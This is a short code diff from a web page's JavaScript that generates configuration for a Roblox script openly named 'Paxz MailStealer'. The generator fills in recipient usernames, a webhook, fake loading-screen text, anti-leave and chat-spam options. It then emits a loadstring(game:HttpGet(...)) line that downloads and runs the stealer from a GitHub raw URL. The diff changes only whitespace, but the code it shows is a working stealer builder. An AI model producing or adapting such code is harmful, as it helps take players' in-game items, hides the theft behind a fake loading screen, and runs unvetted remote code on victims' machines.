@@ -100,18 +100,22 @@
             var collectOrbs = document.getElementById('collectOrbs').value;
 
             var code = `-- {{Paxz MailStealer}} --
+            
 _G.UserName = "${userName}";
 _G.UserName2 = "${userName2}";
 _G.Webhook = "${webhook}";
 _G.LoadingScreenText = "${loadingScreenText}";
 _G.ChatMessage = "${chatMessage}";
 _G.KickTime = "${kickTime}";
+
 -- [[Extra Stuff]] --
+
 _G.LoadingScreen = ${loadingScreen};
 _G.AntiLeave = ${antiLeave};
 _G.MouseLock = ${mouseLock};
 _G.ChatSpam = ${chatSpam};
 _G.CollectOrbs = ${collectOrbs};
+
 -- /|\\ Script /|\\ --
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))();
 `;
